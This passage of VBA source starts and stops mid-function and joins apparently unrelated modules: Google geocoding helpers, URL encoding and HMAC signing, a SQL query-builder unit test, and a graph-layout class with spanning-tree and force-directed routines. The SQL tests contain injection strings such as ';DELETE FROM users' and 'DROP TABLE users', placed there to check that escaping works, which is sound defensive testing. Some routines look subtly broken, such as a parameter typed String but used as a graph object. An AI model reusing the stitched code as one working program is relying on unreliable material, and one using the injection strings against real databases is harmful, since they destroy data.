  ElseIf gintType = 1 Then ' Enterprise Geocoder
    strQuery = strQuery & "&client=" & gstrClientID
    strQuery = strQuery & "&signature=" & Base64_HMACSHA1(strQuery, gstrKey)
  ElseIf gintType = 2 Then ' API Premium Plan
    strQuery = strQuery & "&key=" & gstrKey
  End If

  'define XML and HTTP components
  Dim googleResult As New MSXML2.DOMDocument60
  Dim googleService As New MSXML2.XMLHTTP60
  Dim oNodes As MSXML2.IXMLDOMNodeList
  Dim oNode As MSXML2.IXMLDOMNode

  Sleep (5)

  'create HTTP request to query URL - make sure to have
  googleService.Open "GET", gstrGeocodingDomain & strQuery, False
  googleService.send
  googleResult.LoadXML (googleService.responseText)

  Set oNodes = googleResult.getElementsByTagName("geometry")

  If oNodes.Length = 1 Then
    For Each oNode In oNodes
      Debug.Print oNode.text
      strLatitude = oNode.ChildNodes(0).ChildNodes(0).text
      strLongitude = oNode.ChildNodes(0).ChildNodes(1).text
      AddressGeocode = strLatitude & "," & strLongitude
    Next oNode
  Else
    AddressGeocode = "Not Found (try again, you may have done too many too fast)"
  End If
End Function


Public Function URLEncode(StringToEncode As String, Optional _
   UsePlusRatherThanHexForSpace As Boolean = False) As String

Dim TempAns As String
Dim CurChr As Integer
CurChr = 1
Do Until CurChr - 1 = Len(StringToEncode)
  Select Case asc(Mid(StringToEncode, CurChr, 1))
    Case 48 To 57, 65 To 90, 97 To 122
      TempAns = TempAns & Mid(StringToEncode, CurChr, 1)
    Case 32
      If UsePlusRatherThanHexForSpace = True Then
        TempAns = TempAns & "+"
      Else
        TempAns = TempAns & "%" & Hex(32)
      End If
   Case Else
         TempAns = TempAns & "%" & _
              Format(Hex(asc(Mid(StringToEncode, _
              CurChr, 1))), "00")
End Select

  CurChr = CurChr + 1
Loop

URLEncode = TempAns
End Function


Public Function ReverseGeocode(lat As String, lng As String) As String
  Dim strAddress As String
  Dim strLat As String
  Dim strLng As String
  Dim strQuery As String
  Dim strLatitude As String
  Dim strLongitude As String

  strLat = URLEncode(lat)
  strLng = URLEncode(lng)

  'Assemble the query string
  strQuery = gstrGeocodingURL
  strQuery = strQuery & "latlng=" & strLat & "," & strLng
  If gintType = 0 Then ' free-ish Google Geocoder - now requires an API key!
    strQuery = strQuery & "&key=" & gstrKey
  ElseIf gintType = 1 Then ' Enterprise Geocoder
    strQuery = strQuery & "&client=" & gstrClientID
    strQuery = strQuery & "&signature=" & Base64_HMACSHA1(strQuery, gstrKey)
  ElseIf gintType = 2 Then ' API Premium Plan
    strQuery = strQuery & "&key=" & gstrKey
  End If

  'define XML and HTTP components
  Dim googleResult As New MSXML2.DOMDocument60
  Dim googleService As New MSXML2.XMLHTTP60
  Dim oNodes As MSXML2.IXMLDOMNodeList
  Dim oNode As MSXML2.IXMLDOMNode

  Sleep (5)

  'create HTTP request to query URL - make sure to have
  googleService.Open "GET", gstrGeocodingDomain & strQuery, False
  googleService.send
  googleResult.LoadXML (googleService.responseText)

  Set oNodes = googleResult.getElementsByTagName("formatted_address")
  
  If oNodes.Length > 0 Then
    ReverseGeocode = oNodes.Item(0).text
  Else
    ReverseGeocode = "Not Found (try again, you may have done too many too fast)"
  End If
End Function


Public Function Base64_HMACSHA1(ByVal strTextToHash As String, ByVal strSharedSecretKey As String)

    Dim asc As Object
    Dim enc As Object
    Dim TextToHash() As Byte
    Dim SharedSecretKey() As Byte
    Dim bytes() As Byte
    
    Set asc = CreateObject("System.Text.UTF8Encoding")
    Set enc = CreateObject("System.Security.Cryptography.HMACSHA1")
    
    strSharedSecretKey = Replace(Replace(strSharedSecretKey, "-", "+"), "_", "/")
    SharedSecretKey = Base64Decode(strSharedSecretKey)
    enc.key = SharedSecretKey
    
    TextToHash = asc.Getbytes_4(strTextToHash)
    bytes = enc.ComputeHash_2((TextToHash))
    Base64_HMACSHA1 = Replace(Replace(Base64Encode(bytes), "+", "-"), "/", "_")

End Function


Public Function SQL_RunUnitTests()
    Dim Interfaced As iSQLQuery
    
    '*****************Check Create*****************
    'Dim MyCreate As SQLCreate
    'Set MyCreate = Create_SQLCreate
    'With MyCreate
    '    .Table = "users"
    '    .Fields = Array(Array("id", "int"), Array("username", "varchar", 50))
    'End With
    'Dim Interfaced As iSQLQuery
    'Set Interfaced = MyCreate
    'CheckSQLValue Interfaced, "CREATE TABLE users (id int, username varchar(50))"
    
    '*****************Check Database*******************************************
    Dim MyDatabase As SQLDatabase
    Set MyDatabase = Create_SQLDatabase()
    Dim MyRecordset As New SQLTestRecordset
    Dim MyConnection As New SQLTestConnection
    With MyDatabase
        .DSN = "mydsn"
        .DBType = "mssql"
        .Password = "Pa$$word"
        .UserName = "myusername"
        Set .Recordset = MyRecordset
        Set .Connection = MyConnection
    End With
    
    Dim SimpleInsert As SQLInsert
    Set SimpleInsert = Create_SQLInsert
    With SimpleInsert
        .Table = "users"
        .Fields = Array("id")
        .Values = Array(1)
    End With
    CheckPrimativeValue MyDatabase.InsertGetNewId(SimpleInsert), "SET NOCOUNT ON;INSERT INTO users (id) VALUES (1);SELECT SCOPE_IDENTITY() as somethingunique"
    
    MyDatabase.DBType = "psql"
    CheckPrimativeValue MyDatabase.InsertGetNewId(SimpleInsert, "id"), "INSERT INTO users (id) VALUES (1) RETURNING id"
    
    '******************************Check Delete********************************
    Dim MyDelete As SQLDelete
    Set MyDelete = Create_SQLDelete()
    MyDelete.Table = "users"
    
    Set Interfaced = MyDelete
    CheckSQLValue Interfaced, "DELETE FROM users"
    
    MyDelete.AddWhere "age", ":age", "<"
    MyDelete.AddArgument ":age", 13
    CheckSQLValue Interfaced, "DELETE FROM users WHERE age<13"
    
    '*********************Check Insert*****************************************
    Dim MyInsert As SQLInsert
    Set MyInsert = Create_SQLInsert
    MyInsert.Table = "users"
    MyInsert.Fields = Array("name", "type")
    MyInsert.Values = Array("'foo'", "'admin'")
    MyInsert.Returning = "id"
    Set Interfaced = MyInsert
    CheckSQLValue Interfaced, "INSERT INTO users (name, type) VALUES ('foo', 'admin') RETURNING id"
    
    Dim MySelect As SQLSelect
    Set MySelect = Create_SQLSelect
    With MySelect
        .Table = "account_types"
        .Fields = Array("'foo'", "id")
        .AddWhere "type", ":type"
        .AddArgument ":type", "admin"
    End With
    With MyInsert
        .Fields = Array("name", "type_id")
        .Values = Array()
        Set .From = MySelect
    End With
    CheckSQLValue Interfaced, "INSERT INTO users (name, type_id) (SELECT 'foo', id FROM account_types WHERE type='admin') RETURNING id"
    
    'Insert Multiple Values
    Set MyInsert = Create_SQLInsert
    MyInsert.Table = "users"
    MyInsert.Fields = Array("name", "type")
    Dim Values(1) As Variant
    
    Values(0) = Array("'foo'", "'admin'")
    Values(1) = Array("'bar'", "'editor'")
    MyInsert.Values = Values
    Set Interfaced = MyInsert
    CheckSQLValue Interfaced, "INSERT INTO users (name, type) VALUES ('foo', 'admin'), ('bar', 'editor')"
    '*******************Check Recordset****************************************
    
    
    '*******************Check Select*******************************************
    Set MySelect = Create_SQLSelect
    MySelect.Table = "users"
    MySelect.Fields = Array("id", "username")
    MySelect.AddWhere "created", "'2000-01-01'", ">"
    Set Interfaced = MySelect
    CheckSQLValue Interfaced, "SELECT id, username FROM users WHERE created>'2000-01-01'"
    
    MySelect.AddWhere "type", "'admin'"
    CheckSQLValue Interfaced, "SELECT id, username FROM users WHERE created>'2000-01-01' AND type='admin'"
    
    MySelect.AddWhere "flag", "NULL", "IS", "OR"
    CheckSQLValue Interfaced, "SELECT id, username FROM users WHERE (created>'2000-01-01' AND type='admin') OR flag IS NULL"

    Dim MyOtherSelect As SQLSelect
    Set MyOtherSelect = Create_SQLSelect
    MyOtherSelect.getByProperty "users", "id", "name", ":name"
    MyOtherSelect.AddArgument ":name", "admin"
    Set Interfaced = MyOtherSelect
    CheckSQLValue Interfaced, "SELECT id FROM users WHERE name='admin'"
    
    'Check Join
    Set MySelect = Create_SQLSelect
    With MySelect
        .AddTable "users", "u"
        .InnerJoin "countries", "c", "u.country=c.country"
        .Fields = Array("u.uname", "c.capital")
    End With
    Set Interfaced = MySelect
    CheckSQLValue Interfaced, "SELECT u.uname, c.capital FROM users u INNER JOIN countries c ON u.country=c.country"
    
    MySelect.AddField "t.zone"
    MySelect.InnerJoin "timezones", "t", "c.capital=t.city"
    CheckSQLValue Interfaced, "SELECT u.uname, c.capital, t.zone FROM users u INNER JOIN countries c ON u.country=c.country INNER JOIN timezones t ON c.capital=t.city"
    
    'Distinct
    Set MySelect = Create_SQLSelect
    With MySelect
        .AddTable "customers", "c"
        .Fields = Array("c.country")
        .Distinct
        .OrderBy ("c.country")
    End With
    Set Interfaced = MySelect
    CheckSQLValue Interfaced, "SELECT DISTINCT c.country FROM customers c ORDER BY c.country ASC"
    
    '*******************Check Static****************************************
    Dim MyStatic As SQLStaticQuery
    Set MyStatic = Create_SQLStaticQuery
    MyStatic.Query = "DELETE FROM users"
    Set Interfaced = MyStatic
    CheckSQLValue Interfaced, "DELETE FROM users"
    
    'Name missing ":"
    MyStatic.Query = "SELECT name FROM users WHERE id=:id"
    MyStatic.AddArgument "id", 4
    CheckSQLValue Interfaced, "SELECT name FROM users WHERE id=:id"
    
    'Proper function
    MyStatic.AddArgument ":id", 4
    CheckSQLValue Interfaced, "SELECT name FROM users WHERE id=4"
    
    'Can Change value
    MyStatic.AddArgument ":id", 40
    CheckSQLValue Interfaced, "SELECT name FROM users WHERE id=40"
    
    'Text is escaped
    MyStatic.AddArgument ":id", "text"
    CheckSQLValue Interfaced, "SELECT name FROM users WHERE id='text'"
    
    'Multiple arguments
    MyStatic.Query = "SELECT name FROM users WHERE id=:id AND type=:type"
    MyStatic.ClearArguments
    MyStatic.AddArgument ":type", "admin"
    CheckSQLValue Interfaced, "SELECT name FROM users WHERE id=:id AND type='admin'"
    MyStatic.ClearArguments
    MyStatic.AddArgument ":id", 4
    CheckSQLValue Interfaced, "SELECT name FROM users WHERE id=4 AND type=:type"
    
    MyStatic.AddArgument ":type", "admin"
    CheckSQLValue Interfaced, "SELECT name FROM users WHERE id=4 AND type='admin'"
    
    'Can not place an argument in a value
    MyStatic.AddArgument ":id", "4:type"
    MyStatic.AddArgument ":type", ";DELETE FROM users;:id"
    CheckSQLValue Interfaced, "SELECT name FROM users WHERE id='4:type' AND type=';DELETE FROM users;:id'"
    '*******************Check SubSelect****************************************
    'Dim MySubselect As New SQLSubselect
    'Set MySubselect.SelectSQL = MyOtherSelect
    'MySubselect.SelectAs = "user_id"
    'CheckSQLValue MySubselect, "(SELECT id FROM users WHERE name='admin') AS user_id"
    
    '******************************Check Update********************************
    Dim MyUpdate As SQLUpdate
    Set MyUpdate = Create_SQLUpdate
    With MyUpdate
        .Table = "users"
        .Fields = Array("username")
        .Values = Array(str("admin' WHERE id=1;DROP TABLE users;"))
        .AddWhere "id", 1
    End With
    Set Interfaced = MyUpdate
    CheckSQLValue Interfaced, "UPDATE users SET username='admin'' WHERE id=1;DROP TABLE users;' WHERE id=1"
    
    '****************Check Where Group*****************************************
    'Dim MyWhereGroup As New SQLWhereGroup
    'Dim MyOtherWhere As New SQLCondition
    'MyOtherWhere.Create "type", "'toys'"
    'MyWhereGroup.SetGroup MyWhere, MyOtherWhere, "AND"
    'CheckSQLValue MyWhereGroup, "id=2 AND type='toys'"
    
    'Dim MyThirdWhere As New SQLCondition
    'MyThirdWhere.Create "color", "'pink'"
    
    'MyWhereGroup.AddWhere MyThirdWhere, "OR"
    'CheckSQLValue MyWhereGroup, "(id=2 AND type='toys') OR color='pink'"
    
    'Dim MyOtherWhereGroup As New SQLWhereGroup
    'MyOtherWhereGroup.SetGroup MyWhere, MyThirdWhere, "OR"
    'MyWhereGroup.AddWhere MyOtherWhereGroup, "AND"
    'CheckSQLValue MyWhereGroup, "((id=2 AND type='toys') OR color='pink') AND (id=2 OR color='pink')"

End Function

Public Property Get Size() As Long
    Size = pSize
End Property

Public Property Get n_edge() As Long
    n_edge = pn_edge
End Property

Public Property Get EdgeList() As Long()
    EdgeList = pEdgeList
End Property

Public Property Get EdgeDist() As Double()
    EdgeDist = pEdgeDist
End Property

Public Property Get node_pos() As Double()
    node_pos = pnode_pos
End Property

Public Property Let node_pos(x() As Double)
    pnode_pos = x
End Property

Public Property Get node_degree() As Long()
    node_degree = pnode_degree
End Property

Public Property Get node_degree_wgt() As Double()
    node_degree_wgt = pnode_degree_wgt
End Property

Public Property Get node_idx() As Long()
    node_idx = pnode_idx
End Property

Public Property Get node_next() As Long()
    node_next = pnode_next
End Property

Public Property Let node_next(x() As Long)
    pnode_next = x
End Property

Public Property Get node_closeness() As Double()
    node_closeness = pnode_closeness
End Property

Public Property Get node_eigen() As Double()
    node_eigen = pnode_eigen
End Property

Public Property Get node_Katz() As Double()
    node_Katz = pnode_Katz
End Property


'=== Build Minimum Spanning Tree from a pairwise distance matrix
'Input: Symmetric Distance(N x N) matrix
Sub MST_Build(distance As Variant, Optional input_format = "MATRIX", Optional AdjList As Variant)
Dim i As Long, j As Long, k As Long, m As Long, n As Long
Dim n_pairs As Long
Dim temp1 As Long, temp2 As Long
Dim parent() As Long, sort_index() As Long
Dim tmp_x As Double
Dim xArr() As Double, iArr() As Long, PairList() As Long, d() As Double
Dim n_component As Long

If input_format = "MATRIX" Then
    pSize = UBound(distance, 1)
    n_pairs = pSize * (pSize - 1) / 2
    k = 0
    ReDim d(1 To n_pairs)
    For i = 1 To pSize - 1
        For j = i + 1 To pSize
            k = k + 1
            d(k) = distance(i, j)
        Next j
    Next i
    n_component = 1
ElseIf input_format = "ADJ_LIST" Then
    pSize = UBound(distance, 1)
    Call Convert_ADJ_LIST_2_EDGE_LIST(distance, AdjList, PairList, d, pSize, n_pairs)
    n_component = count_component(PairList, d, "EDGE_LIST")
ElseIf input_format = "EDGE_LIST" Then
    n_pairs = UBound(distance, 1)
    d = distance
    PairList = AdjList
    pSize = 0
    For k = 1 To n_pairs
        If AdjList(k, 1) > pSize Then pSize = AdjList(k, 1)
        If AdjList(k, 2) > pSize Then pSize = AdjList(k, 2)
    Next k
    n_component = count_component(PairList, d, "EDGE_LIST")
End If

ReDim pnode_idx(1 To pSize)
For i = 1 To pSize
    pnode_idx(i) = i
Next i

Application.StatusBar = "Building MST: Sorting distances...."
Call modMath.Sort_Quick_A(d, 1, n_pairs, sort_index)

pn_edge = 0
ReDim parent(1 To pSize)
ReDim pEdgeList(1 To pSize - n_component, 1 To 2)
ReDim pEdgeDist(1 To pSize - n_component)
For k = 1 To n_pairs

    If input_format = "MATRIX" Then
        Call condense2sq(sort_index(k), pSize, m, n)
    Else
        m = PairList(sort_index(k), 1)
        n = PairList(sort_index(k), 2)
    End If
    
    If parent(m) <> parent(n) Or (parent(m) + parent(n)) = 0 Then
    
        'Union the pair into the same parent
        temp1 = parent(m)
        temp2 = parent(n)
        parent(m) = m
        parent(n) = m
        
        For i = 1 To pSize
            If (parent(i) = temp1 Or parent(i) = temp2) And parent(i) > 0 Then
                parent(i) = m
            End If
        Next i

        pn_edge = pn_edge + 1
        pEdgeList(pn_edge, 1) = m
        pEdgeList(pn_edge, 2) = n
        pEdgeDist(pn_edge) = d(k)
        If pn_edge = (pSize - n_component) Then Exit For
        
        DoEvents
        Application.StatusBar = "cMST.Build: " & pn_edge & " / " & (pSize - n_component)
        
    End If

Next k

If pn_edge <> (pSize - n_component) Then
    Debug.Print "MST_Build Fail: Num of edges is not equal to N-1"
End If

Erase parent, sort_index, d
Application.StatusBar = False

Randomize
ReDim pnode_pos(1 To pSize, 1 To 2)
For i = 1 To pSize
    pnode_pos(i, 1) = (-0.5 + Rnd()) * Sqr(pSize)
    pnode_pos(i, 2) = (-0.5 + Rnd()) * Sqr(pSize)
Next i
End Sub


'=== Import graph from user supplied EdgeList, EdgeDist and node_pos
Sub Init(EdgeList As Variant, EdgeDist As Variant, node_pos() As Double, _
    Optional input_format = "EDGE_LIST")
Dim i As Long, j As Long, k As Long
    If input_format = "EDGE_LIST" Then
        pn_edge = UBound(EdgeDist, 1)
        pSize = UBound(node_pos, 1)
        pEdgeList = EdgeList
        pEdgeDist = EdgeDist
    ElseIf input_format = "ADJ_LIST" Then
        Call Convert_ADJ_LIST_2_EDGE_LIST(EdgeDist, EdgeList, pEdgeList, pEdgeDist, pSize, pn_edge)
    ElseIf input_format = "MATRIX" Then
        pSize = UBound(EdgeDist, 1)
        pn_edge = pSize * (pSize - 1) / 2
        k = 0
        ReDim pEdgeDist(1 To pn_edge)
        ReDim pEdgeList(1 To pn_edge, 1 To 2)
        For i = 1 To pSize - 1
            For j = i + 1 To pSize
                pEdgeDist(k) = EdgeDist(k)
                pEdgeList(k, 1) = i
                pEdgeList(k, 2) = j
            Next j
        Next i
    Else
        Debug.Print "cGraphAlgo: Init: Failed."
        End
    End If
    pnode_pos = node_pos
    ReDim pnode_idx(1 To pSize)
    For i = 1 To pSize
        pnode_idx(i) = i
    Next i
End Sub

''=== Import graph from user supplied EdgeList, EdgeDist and node_pos
'Sub Init(EdgeList() As Long, EdgeDist() As Double, node_pos() As Double)
'Dim i As Long
'    pn_edge = UBound(EdgeDist, 1)
'    pSize = UBound(node_pos, 1)
'    pEdgeList = EdgeList
'    pEdgeDist = EdgeDist
'    pnode_pos = node_pos
'    ReDim pnode_idx(1 To pSize)
'    For i = 1 To pSize
'        pnode_idx(i) = i
'    Next i
'End Sub

''=== Import graph from user supplied adjacency list and node_pos
'Sub Init_by_AdjList(AdjList As Variant, AdjDist As Variant, node_pos() As Double)
'Dim i As Long
'    Call Convert_ADJ_LIST_2_EDGE_LIST(AdjDist, AdjList, pEdgeList, pEdgeDist, pSize, pn_edge)
'    pnode_pos = node_pos
'    ReDim pnode_idx(1 To pSize)
'    For i = 1 To pSize
'        pnode_idx(i) = i
'    Next i
'End Sub

'=== Release memory
Sub Reset()
    pSize = 0
    pn_edge = 0
    Erase pEdgeList, pEdgeDist, pnode_pos, pnode_idx, pnode_next
    Erase pnode_Katz, pnode_eigen, pnode_degree, pnode_closeness
End Sub

Function Print_Edges()
Dim i As Long, j As Long, k As Long, n As Long
Dim vArr As Variant
    ReDim vArr(1 To pn_edge * 3, 1 To 2)
    k = 1
    For n = 1 To pn_edge
        i = pEdgeList(n, 1)
        j = pEdgeList(n, 2)
        vArr(k, 1) = pnode_pos(i, 1)
        vArr(k, 2) = pnode_pos(i, 2)
        vArr(k + 1, 1) = pnode_pos(j, 1)
        vArr(k + 1, 2) = pnode_pos(j, 2)
        k = k + 3
    Next n
    Print_Edges = vArr
    Erase vArr
End Function


'=== Arrange graph layout by force directed algorithm
'=== c1 is spring strength, c2 is sprint natural length, c3 is repulsive strength
Sub ForceDirectedLayout(Optional c1 As Double = 2, Optional c2 As Double = 1, Optional c3 As Double = 1, _
        Optional iter_max As Long = 500)
Dim i As Long, j As Long, k As Long, m As Long, n As Long, iterate As Long
Dim tmp_x As Double, tmp_y As Double
Dim dist() As Double, force() As Double, force_xy() As Double
Dim energy As Double, energy_prev As Double, temperature As Double

energy_prev = Exp(70)
temperature = c2
ReDim dist(1 To pSize, 1 To pSize)
ReDim force(1 To pSize, 1 To pSize)
For iterate = 1 To iter_max

    If iterate Mod 20 = 0 Then
        DoEvents
        Application.StatusBar = "ForceDirected: " & iterate & "/" & iter_max
    End If

    ReDim force_xy(1 To pSize, 1 To 2)

    For i = 1 To pSize - 1
        For j = i + 1 To pSize
            dist(i, j) = Sqr((pnode_pos(i, 1) - pnode_pos(j, 1)) ^ 2 + (pnode_pos(i, 2) - pnode_pos(j, 2)) ^ 2)
            If dist(i, j) > 0 Then force(i, j) = c3 / (dist(i, j) ^ 3)
        Next j
    Next i

    For k = 1 To pn_edge
        i = pEdgeList(k, 1)
        j = pEdgeList(k, 2)
        If i > j Then
            m = i
            i = j
            j = m
        End If
        tmp_x = dist(i, j)
        If tmp_x > 0 Then force(i, j) = force(i, j) - c1 * Log(tmp_x / c2) / tmp_x
    Next k

    For i = 1 To pSize - 1
        For j = i + 1 To pSize
            tmp_x = pnode_pos(i, 1) - pnode_pos(j, 1)
            tmp_y = pnode_pos(i, 2) - pnode_pos(j, 2)
            force_xy(i, 1) = force_xy(i, 1) + force(i, j) * tmp_x
            force_xy(i, 2) = force_xy(i, 2) + force(i, j) * tmp_y
            force_xy(j, 1) = force_xy(j, 1) - force(i, j) * tmp_x
            force_xy(j, 2) = force_xy(j, 2) - force(i, j) * tmp_y
        Next j
    Next i

    energy = 0
    For i = 1 To pSize
        tmp_y = Sqr(force_xy(i, 1) ^ 2 + force_xy(i, 2) ^ 2)
        tmp_x = min2(tmp_y, temperature)
        pnode_pos(i, 1) = pnode_pos(i, 1) + tmp_x * force_xy(i, 1) / tmp_y
        pnode_pos(i, 2) = pnode_pos(i, 2) + tmp_x * force_xy(i, 2) / tmp_y
        energy = energy + tmp_x
    Next i
    energy = energy / pSize
    If energy < energy_prev Then
        temperature = 1.05 * temperature
    Else
        temperature = 0.9 * temperature
    End If
    energy_prev = energy
    If energy < (c2 * 0.01) Then Exit For
    
Next iterate
Erase force, force_xy, dist
Application.StatusBar = False
End Sub


'=== Force Directed algorithm with Barnes-Hut acceleration
Sub ForceDirectedLayout_BarnesHut(Optional c1 As Double = 2, Optional c2 As Double = 1, Optional c3 As Double = 1, _
        Optional iter_max As Long = 500)
Dim i As Long, j As Long, k As Long, iterate As Long
Dim tmp_x As Double, tmp_y As Double, tmp As Double
Dim energy As Double, energy_prev As Double, temperature As Double
Dim quadtree1 As cqtree
Dim force_xy() As Double

energy_prev = Exp(70)
temperature = c2
For iterate = 1 To iter_max
    
    If iterate Mod 50 = 0 Then
        DoEvents
        Application.StatusBar = "ForceDirected (Barnes-Hut): " & iterate & "/" & iter_max
    End If
    
    Set quadtree1 = New cqtree
    force_xy = quadtree1.NetForce(pnode_pos, c3)
    
    For k = 1 To pn_edge
        i = pEdgeList(k, 1)
        j = pEdgeList(k, 2)
        tmp_x = pnode_pos(i, 1) - pnode_pos(j, 1)
        tmp_y = pnode_pos(i, 2) - pnode_pos(j, 2)
        tmp = Sqr(tmp_x ^ 2 + tmp_y ^ 2)
        If tmp > 0 Then
            tmp = c1 * Log(tmp / c2) / tmp
            force_xy(i, 1) = force_xy(i, 1) - tmp * tmp_x
            force_xy(i, 2) = force_xy(i, 2) - tmp * tmp_y
            force_xy(j, 1) = force_xy(j, 1) + tmp * tmp_x
            force_xy(j, 2) = force_xy(j, 2) + tmp * tmp_y
        End If
    Next k
    
    energy = 0
    For i = 1 To pSize
        tmp = Sqr(force_xy(i, 1) ^ 2 + force_xy(i, 2) ^ 2)
        tmp_x = min2(tmp, temperature)
        pnode_pos(i, 1) = pnode_pos(i, 1) + tmp_x * force_xy(i, 1) / tmp
        pnode_pos(i, 2) = pnode_pos(i, 2) + tmp_x * force_xy(i, 2) / tmp
        energy = energy + tmp_x
    Next i
    energy = energy / pSize
    If energy < energy_prev Then
        temperature = 1.05 * temperature
    Else
        temperature = 0.9 * temperature
    End If
    energy_prev = energy
    If energy < (c2 * 0.01) Then Exit For
Next iterate

Set quadtree1 = Nothing
Erase force_xy
Application.StatusBar = False
End Sub

Private Function min2(x As Double, y As Double) As Double
min2 = x
If y < x Then min2 = y
End Function


'=== Force Directed algorithm with multi-level and Barnes-Hut acceleration
Sub ForceDirected_MultiLevel(Optional c1 As Double = 2, Optional c2 As Double = 1, Optional c3 As Double = 1, _
        Optional iter_max As Long = 300)
Dim i As Long, j As Long, k As Long, n As Long, m As Long
Dim g2 As cGraphAlgo, g_tmp As cGraphAlgo
Dim G_List As Collection
Dim node_pos() As Double

Set G_List = New Collection
Set g_tmp = New cGraphAlgo
Call g_tmp.Copy(Me)
Do
    Set g2 = New cGraphAlgo
    Call g2.Collapse(g_tmp)
    G_List.Add g_tmp
    If g2.Size <= 5 Then Exit Do
    Set g_tmp = New cGraphAlgo
    Call g_tmp.Copy(g2)
Loop
G_List.Add g2

i = 0
Do While G_List.count > 0
    DoEvents
    Application.StatusBar = "ForceDirected (Multilevel): " & G_List.count & "->1"
    i = i + 1
    With G_List
        Set g2 = .Item(.count)
        .Remove .count
    End With
    With g2
        If i > 1 Then Call .IntrapolateLayout(node_pos)
        Call .ForceDirectedLayout_BarnesHut(c1, c2, c3, iter_max)
        node_pos = .node_pos
        Call .Reset
    End With
Loop
pnode_pos = node_pos

'Release memory
Erase node_pos
Set g2 = Nothing
Set g_tmp = Nothing
Set G_List = Nothing
End Sub


'Given the layout of a coarsened graph, recover layout of the finer graph
'Input: node_pos() from a coarsened graph with layout already found
Sub IntrapolateLayout(node_pos() As Double)
Dim i As Long, j As Long
ReDim pnode_pos(1 To pSize, 1 To 2)
For i = 1 To pSize
    j = pnode_next(i)
    pnode_pos(i, 1) = node_pos(j, 1) + (-0.1 + 0.2 * Rnd())
    pnode_pos(i, 2) = node_pos(j, 2) + (-0.1 + 0.2 * Rnd())
Next i
End Sub


'=== Coarsen an input graph by collapsing edges until graph is half-size
'=== mapping of nodes is saved in .node_next attribute of input graph
Sub Collapse(g As String)
Dim i As Long, j As Long, k As Long, n As Long, m As Long
Dim u As Long, v As Long, w As Long
Dim EdgeList() As Long, EdgeDist() As Double, node_pos() As Double
Dim node_next() As Long

With g
    n = .Size
    m = .n_edge
    EdgeList = .EdgeList
    EdgeDist = .EdgeDist
    node_pos = .node_pos
End With

If n = 2 Then
    Debug.Print "Only 2 nodes left. Cannot collapse."
    Exit Sub
End If

w = n
pSize = n
pn_edge = m
ReDim node_next(1 To n)
For k = pn_edge To 1 Step -1
    u = EdgeList(k, 1)
    v = EdgeList(k, 2)
    If u <= n And v <= n Then
        w = w + 1
        node_next(u) = w
        node_next(v) = w
        pSize = pSize - 1
        Call EdgeList_Relabel(EdgeList, u, v, w)
    ElseIf u > n And v <= n Then
        node_next(v) = u
        pSize = pSize - 1
        Call EdgeList_Relabel(EdgeList, u, v, u)
    ElseIf v > n And u <= n Then
        node_next(u) = v
        pSize = pSize - 1
        Call EdgeList_Relabel(EdgeList, u, v, v)
    End If
    If pSize = 2 Or pSize < (n \ 2) Then Exit For
Next k

For i = 1 To n
    If node_next(i) = 0 Then
        w = w + 1
        node_next(i) = w
    End If
Next i

For k = 1 To pn_edge
    u = EdgeList(k, 1)
    v = EdgeList(k, 2)
    If u <= n Then EdgeList(k, 1) = node_next(u)
    If v <= n Then EdgeList(k, 2) = node_next(v)
    EdgeList(k, 1) = EdgeList(k, 1) - n
    EdgeList(k, 2) = EdgeList(k, 2) - n
Next k
For i = 1 To n
    node_next(i) = node_next(i) - n
Next i

g.node_next = node_next
Call EdgeList_Purge(EdgeList)
pn_edge = UBound(EdgeList, 1)
pEdgeList = EdgeList

ReDim pnode_pos(1 To pSize, 1 To 2)
For i = 1 To n
    j = node_next(i)
    pnode_pos(j, 1) = node_pos(i, 1)
    pnode_pos(j, 2) = node_pos(i, 2)
Next i
End Sub

'=== Relabel u and v to w in EdgeList()
Private Sub EdgeList_Relabel(EdgeList() As Long, u As Long, v As Long, w As Long)
Dim i As Long, j As Long, k As Long, n As Long
n = UBound(EdgeList, 1)
For k = 1 To n
    If (EdgeList(k, 1) = u Or EdgeList(k, 1) = v) Then EdgeList(k, 1) = w
    If (EdgeList(k, 2) = u Or EdgeList(k, 2) = v) Then EdgeList(k, 2) = w
Next k
End Sub

'=== Remove duplicate edges and self-cycle from EdgeList()
Private Sub EdgeList_Purge(EdgeList() As Long)
Dim i As Long, j As Long, k As Long, m As Long, n As Long, n_edge As Long, isUnique As Long, count As Long
Dim newEdgeList() As Long
n_edge = UBound(EdgeList, 1)
count = 0
ReDim newEdgeList(1 To 2, 1 To n_edge)
For k = 1 To n_edge
    m = EdgeList(k, 1)
    n = EdgeList(k, 2)
    If m <> n Then
        isUnique = 1
        For i = 1 To count
            If (newEdgeList(1, i) = m And newEdgeList(2, i) = n) _
                Or (newEdgeList(1, i) = n And newEdgeList(2, i) = m) Then
                isUnique = 0
                Exit For
            End If
        Next i
        If isUnique = 1 Then
            count = count + 1
            newEdgeList(1, count) = m
            newEdgeList(2, count) = n
        End If
    End If
Next k
ReDim Preserve newEdgeList(1 To 2, 1 To count)
Call mTranspose(newEdgeList, EdgeList)
Erase newEdgeList
End Sub


'=== Find degree of each node
Sub Find_degree()
Dim i As Long, j As Long, k As Long
    ReDim pnode_degree(1 To pSize)
    For k = 1 To pn_edge
        i = pEdgeList(k, 1)
        j = pEdgeList(k, 2)
        pnode_degree(i) = pnode_degree(i) + 1
        pnode_degree(j) = pnode_degree(j) + 1
    Next k
End Sub


'=== Find weighted degree of each node
Sub Find_degree_wgt()
Dim i As Long, j As Long, k As Long
    ReDim pnode_degree_wgt(1 To pSize)
    For k = 1 To pn_edge
        i = pEdgeList(k, 1)
        j = pEdgeList(k, 2)
        pnode_degree_wgt(i) = pnode_degree_wgt(i) + 1# / pEdgeDist(k)
        pnode_degree_wgt(j) = pnode_degree_wgt(j) + 1# / pEdgeDist(k)
    Next k
End Sub

'=== Find closeness of each node
Sub Find_closeness()
Dim i As Long, j As Long, k As Long
Dim tmp_x As Double
Dim dist() As Double
    ReDim pnode_closeness(1 To pSize)
    Call Dijkstra_Algorithm(dist)
    For i = 1 To pSize
        tmp_x = 0
        For j = 1 To pSize
            If i <> j Then tmp_x = tmp_x + dist(i, j)
        Next j
        pnode_closeness(i) = (pSize - 1) / tmp_x
    Next i
    Erase dist
End Sub


'=== Find shortest path between all pairs using Dijkstra's algorithm
Sub Dijkstra_Algorithm(dist() As Double)
Dim i As Long, j As Long, k As Long, n As Long, s As Long, u As Long, v As Long
Dim tmp_x As Double, d_min As Double, INFINITY As Double
Dim max_degree As Long
Dim neighbour() As Long, sort_index() As Long
Dim d() As Double, neighbour_dist() As Double
Dim q As cHeap

INFINITY = Exp(70)

max_degree = 0
Call Me.Find_degree
For i = 1 To pSize
